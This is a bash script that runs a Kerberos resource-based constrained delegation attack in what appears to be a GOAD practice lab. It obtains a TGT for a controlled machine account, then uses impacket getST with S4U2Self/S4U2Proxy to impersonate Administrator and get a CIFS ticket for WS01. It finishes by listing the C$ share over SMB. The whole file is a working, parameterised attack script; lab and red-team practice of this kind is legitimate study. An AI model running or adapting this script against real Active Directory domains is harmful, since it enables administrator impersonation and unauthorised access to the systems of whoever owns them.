#!/usr/bin/env bash
# Prove the S4U consequence of the controlled NORTH RBCD fixture.
# Uses the known PHASE03RBCD$ password from the local mode-0600 secret file,
# obtains a forwardable TGT with kinit, requests an Administrator CIFS ticket
# for WS01 through S4U2Self/S4U2Proxy, then proves read-only access to C$.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
DOMAIN="${DOMAIN:-north.sevenkingdoms.local}"
REALM="${REALM:-NORTH.SEVENKINGDOMS.LOCAL}"
DC_IP="${DC_IP:-10.4.10.11}"
TARGET_FQDN="${TARGET_FQDN:-ws01.north.sevenkingdoms.local}"
TARGET_IP="${TARGET_IP:-10.4.10.31}"
COMPUTER="${COMPUTER:-PHASE03RBCD$}"
IMPERSONATE="${IMPERSONATE:-Administrator}"
SECRET_FILE="${SECRET_FILE:-$HOME/.config/kingdoms/phase03-rbcd-password}"
WORK="${WORK:-/tmp/kingdoms-phase03-rbcd-s4u}"
KRB5_CONFIG_FILE="$WORK/krb5.conf"
TGT_CACHE="$WORK/phase03rbcd-tgt.ccache"
SMB_CMDS="$WORK/smbclient.txt"

find_cmd() {
  local name c
  name="$1"; shift
  for c in "$(command -v "$name" 2>/dev/null || true)" "$@"; do
    [[ -n "$c" && -x "$c" ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT" || exit 1

echo '===== S4U PREFLIGHT ====='
test -f "$SECRET_FILE" || { echo "FAIL: RBCD secret file missing: $SECRET_FILE" >&2; exit 1; }
perm="$(stat -Lc "%a" "$SECRET_FILE")"
[[ "$perm" == "600" ]] || { echo "FAIL: RBCD secret file mode is $perm, expected 600" >&2; exit 1; }
PASSWORD="$(cat "$SECRET_FILE")"
[[ -n "$PASSWORD" ]] || { echo "FAIL: RBCD secret file is empty" >&2; exit 1; }

KINIT="$(find_cmd kinit)" || { echo "FAIL: kinit not found" >&2; exit 1; }
KLIST="$(find_cmd klist)" || { echo "FAIL: klist not found" >&2; exit 1; }
GETST="$(find_cmd impacket-getST /usr/share/doc/python3-impacket/examples/getST.py)" || { echo "FAIL: impacket-getST/getST.py not found" >&2; exit 1; }
SMBCLIENT="$(find_cmd impacket-smbclient /usr/share/doc/python3-impacket/examples/smbclient.py)" || { echo "FAIL: impacket-smbclient/smbclient.py not found" >&2; exit 1; }

echo "PASS: secret file mode 600"
echo "PASS: kinit=$KINIT"
echo "PASS: klist=$KLIST"
echo "PASS: getST=$GETST"
echo "PASS: smbclient=$SMBCLIENT"

umask 077
rm -rf "$WORK"
mkdir -p "$WORK"

cat >"$KRB5_CONFIG_FILE" <<EOF
[libdefaults]
 default_realm = $REALM
 dns_lookup_kdc = false
 dns_lookup_realm = false
 rdns = false
 forwardable = true

[realms]
 $REALM = {
  kdc = $DC_IP
 }

[domain_realm]
 .$DOMAIN = $REALM
 $DOMAIN = $REALM
EOF

echo
echo '===== OBTAIN PHASE03RBCD TGT ====='
export KRB5_CONFIG="$KRB5_CONFIG_FILE"
KRB5CCNAME="FILE:$TGT_CACHE" \
  sh -c 'printf "%s\n" "$1" | exec "$2" "$3"' _ "$PASSWORD" "$KINIT" "${COMPUTER}@${REALM}"
"$KLIST" -f -c "$TGT_CACHE"

echo
echo '===== REQUEST ADMINISTRATOR CIFS SERVICE TICKET ====='
(
  cd "$WORK"
  KRB5_CONFIG="$KRB5_CONFIG_FILE" KRB5CCNAME="$TGT_CACHE" \
    "$GETST" \
      -k -no-pass \
      -dc-ip "$DC_IP" \
      -spn "cifs/$TARGET_FQDN" \
      -impersonate "$IMPERSONATE" \
      "$DOMAIN/$COMPUTER"
)

ST_CACHE="$(find "$WORK" -maxdepth 1 -type f -name "${IMPERSONATE}@cifs_${TARGET_FQDN}@*.ccache" -print -quit)"
if [[ -z "$ST_CACHE" ]]; then
  ST_CACHE="$(find "$WORK" -maxdepth 1 -type f -name "${IMPERSONATE}@cifs_${TARGET_FQDN}.ccache" -print -quit)"
fi
[[ -n "$ST_CACHE" && -f "$ST_CACHE" ]] || {
  echo 'FAIL: Administrator CIFS service-ticket cache was not created' >&2
  find "$WORK" -maxdepth 1 -type f -name "*.ccache" -printf "%f\n" >&2 || true
  exit 1
}

echo "PASS: S4U service ticket created: $ST_CACHE"
"$KLIST" -c "$ST_CACHE"

cat >"$SMB_CMDS" <<'EOF'
shares
use C$
ls
exit
EOF

echo
echo '===== PROVE ADMINISTRATOR CIFS ACCESS TO WS01 ====='
KRB5CCNAME="$ST_CACHE" "$SMBCLIENT" \
  -k -no-pass \
  -dc-ip "$DC_IP" \
  -target-ip "$TARGET_IP" \
  -inputfile "$SMB_CMDS" \
  "$REALM/$IMPERSONATE@$TARGET_FQDN"

echo
echo 'PASS: RBCD S4U consequence executed with an Administrator CIFS service ticket for WS01'
echo "INFO: ticket cache retained temporarily at $ST_CACHE until rollback is complete"
